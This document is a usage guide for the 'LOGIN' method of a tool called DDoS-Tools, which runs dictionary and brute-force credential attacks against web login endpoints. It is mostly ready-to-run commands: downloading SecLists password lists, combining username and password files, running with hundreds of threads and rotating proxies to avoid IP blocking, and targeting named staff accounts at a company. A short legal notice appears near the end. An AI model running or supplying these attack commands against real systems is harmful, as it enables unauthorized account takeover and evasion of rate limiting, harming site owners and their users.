# Dictionary Attack Guide

This guide explains how to use dictionary-based password attacks with the LOGIN method in DDoS-Tools. Dictionary sources are configured in `config.json` for easy management and customization.

## Overview

The LOGIN attack method supports dictionary-based credential attacks using password lists from open-source security wordlists. Instead of creating passwords manually, you can download and use well-known password dictionaries.

## Quick Start

### 1. Download a Password Dictionary

```bash
# Download top 1,000 passwords (fastest, recommended for testing)
./ddos-tools dict download passwords-1k

# Download top 10,000 passwords (balanced)
./ddos-tools dict download passwords-10k

# Download top 100,000 passwords (comprehensive)
./ddos-tools dict download passwords-100k

# Download common usernames
./ddos-tools dict download usernames
```

### 2. List Available Dictionaries

```bash
./ddos-tools dict list
```

This shows all downloaded dictionaries with entry counts.

### 3. Run a Login Attack

```bash
# Using only password dictionary (will use default usernames)
./ddos-tools LOGIN https://example.com/api/login --passwords files/passwords-10k.txt --threads 50

# Using both username and password dictionaries
./ddos-tools LOGIN https://example.com/api/login \
  --usernames files/usernames.txt \
  --passwords files/passwords-10k.txt \
  --threads 100 \
  --duration 120

# Auto-download dictionary if not found
./ddos-tools LOGIN https://example.com/login \
  --passwords files/passwords-1k.txt \
  --download-dict \
  --threads 50
```

## Dictionary Types

### Password Dictionaries

| Type | Entries | File Size | Use Case |
|------|---------|-----------|----------|
| `passwords-1k` | 1,000 | ~8 KB | Quick testing, fastest |
| `passwords-10k` | 10,000 | ~80 KB | Balanced performance |
| `passwords-100k` | 100,000 | ~800 KB | Comprehensive coverage |

All password dictionaries come from the [SecLists](https://github.com/danielmiessler/SecLists) project, which contains the most commonly used passwords from real data breaches.

### Username Dictionary

- **usernames**: Common usernames (admin, root, user, etc.)

## Usage Methods

### Method 1: Pre-combined Credentials File

Create a file with `username:password` pairs (one per line):

```
admin:password123
root:admin
user:12345678
administrator:password
```

Then use:

```bash
./ddos-tools LOGIN https://example.com/login --data credentials.txt
```

### Method 2: Separate Dictionary Files

Use separate username and password files. The tool will generate all combinations:

```bash
./ddos-tools LOGIN https://example.com/login \
  --usernames files/usernames.txt \
  --passwords files/passwords-10k.txt
```

**Note**: This generates `usernames × passwords` combinations. For example:
- 10 usernames × 1,000 passwords = 10,000 combinations
- 100 usernames × 10,000 passwords = 1,000,000 combinations

### Method 3: Password Dictionary Only

Use only a password dictionary with default usernames (admin, user, root, administrator, test):

```bash
./ddos-tools LOGIN https://example.com/login --passwords files/passwords-10k.txt
```

This generates 5 × 10,000 = 50,000 combinations.

## Dictionary Sources

All dictionaries are downloaded from the official [SecLists](https://github.com/danielmiessler/SecLists) repository:

- **Passwords**: Top passwords from the 10-million password list
- **Usernames**: Common username shortlist

### Configuration File

Dictionary providers are configured in `config.json`, similar to how proxy providers work. This provides:

- **Centralized management**: All URLs in one place
- **Easy customization**: Add your own dictionary sources
- **No code changes**: Update URLs without recompiling
- **Consistent architecture**: Follows the same pattern as proxy configuration

### config.json Structure

```json
{
  "dictionary-providers": [
    {
      "name": "passwords-500",
      "type": "password",
      "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/500-worst-passwords.txt",
      "filename": "files/passwords-500.txt"
    },
    {
      "name": "passwords-1k",
      "type": "password",
      "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/best1050.txt",
      "filename": "files/passwords-1k.txt"
    },
    {
      "name": "passwords-10k",
      "type": "password",
      "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt",
      "filename": "files/passwords-10k.txt"
    },
    {
      "name": "usernames",
      "type": "username",
      "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt",
      "filename": "files/usernames.txt"
    }
  ]
}
```

### Adding Custom Dictionaries

You can add your own dictionary sources to `config.json`:

```json
{
  "name": "custom-passwords",
  "type": "password",
  "url": "https://example.com/my-password-list.txt",
  "filename": "files/custom-passwords.txt"
}
```

Then download it with:
```bash
./ddos-tools dict download custom-passwords
```

## Advanced Examples

### High-Performance Attack

```bash
# Download dictionary first
./ddos-tools dict download passwords-10k

# Run with many threads
./ddos-tools LOGIN https://target.com/api/auth \
  --passwords files/passwords-10k.txt \
  --threads 500 \
  --rpc 200 \
  --duration 300 \
  --proxy-file http.txt
```

### Targeted Username Attack

Create a custom username file `targets.txt`:
```
john.doe
jane.smith
admin
support
```

Then combine with password dictionary:

```bash
./ddos-tools LOGIN https://company.com/login \
  --usernames targets.txt \
  --passwords files/passwords-1k.txt \
  --threads 100
```

### Custom Credentials

Create your own `custom-creds.txt`:
```
admin:password123
admin:admin2024
root:toor
service:service123
```

Use it directly:

```bash
./ddos-tools LOGIN https://example.com/admin --data custom-creds.txt
```

## Best Practices

1. **Start Small**: Begin with `passwords-1k` for testing
2. **Monitor Resources**: Larger dictionaries use more memory
3. **Combine Wisely**: Be careful with username×password multiplication
4. **Use Proxies**: Distribute requests across proxies to avoid IP blocking
5. **Respect Rate Limits**: Adjust threads and RPC to avoid overwhelming targets

## Default Behavior

If no credentials are provided, the LOGIN method uses these defaults:

**Default Usernames**: admin, user, root, administrator, test
**Default Passwords**: password, 123456, admin, 12345678, password123

This creates 25 default credential combinations.

## File Locations

All dictionaries are stored in the `files/` directory:

```
ddos-tools/
├── files/
│   ├── passwords-1k.txt
│   ├── passwords-10k.txt
│   ├── passwords-100k.txt
│   ├── usernames.txt
│   ├── useragent.txt
│   └── referers.txt
```

## Troubleshooting

### Dictionary Not Found

```bash
# Solution 1: Download it
./ddos-tools dict download passwords-10k

# Solution 2: Use auto-download flag
./ddos-tools LOGIN https://example.com/login \
  --passwords files/passwords-10k.txt \
  --download-dict
```

### Too Many Combinations

If you get millions of combinations, consider:

1. Use a smaller password dictionary (passwords-1k instead of passwords-100k)
2. Reduce the username list to only relevant targets
3. Create a pre-combined credentials file with specific pairs

### Memory Issues

Large dictionaries consume memory. If you experience issues:

1. Use smaller dictionaries (passwords-1k or passwords-10k)
2. Reduce the number of threads
3. Use pre-combined credentials file instead of generating combinations

## Security & Legal Notice

⚠️ **IMPORTANT**: This tool is for educational and authorized testing only.

- Only use on systems you own or have explicit permission to test
- Unauthorized access attempts are illegal in most jurisdictions
- Always follow responsible disclosure practices
- Respect rate limits and terms of service

## Configuration Management

### Viewing Configured Dictionaries

To see all configured dictionary providers:
```bash
./ddos-tools dict list
```

This reads `config.json` and shows which dictionaries are configured and downloaded.

### Modifying Dictionary Sources

1. **Edit config.json**: Modify the `dictionary-providers` array
2. **No rebuild needed**: Changes take effect immediately
3. **Test download**: Run `./ddos-tools dict download <name>`

### Example: Adding a New Source

```json
{
  "name": "rockyou-top100",
  "type": "password",
  "url": "https://example.com/rockyou-top100.txt",
  "filename": "files/rockyou-100.txt"
}
```

### Benefits of Config-Based Approach

1. **No code changes**: Update URLs without recompiling
2. **Version control friendly**: Track dictionary sources in git
3. **Team consistency**: Everyone uses same sources
4. **Easy updates**: SecLists URLs can be updated quickly
5. **Extensible**: Add unlimited custom sources

## Additional Resources

- [SecLists Project](https://github.com/danielmiessler/SecLists)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Main Documentation](../README.md)
- [Configuration File](../config.json)

## Examples Summary

```bash
# Basic usage with auto-download
./ddos-tools LOGIN https://example.com/login --passwords files/passwords-1k.txt --download-dict

# Advanced with custom lists
./ddos-tools LOGIN https://api.example.com/auth \
  --usernames custom-users.txt \
  --passwords files/passwords-10k.txt \
  --threads 200 \
  --proxy-file socks5.txt

# Pre-combined credentials
./ddos-tools LOGIN https://example.com/admin --data credentials.txt --threads 100
```
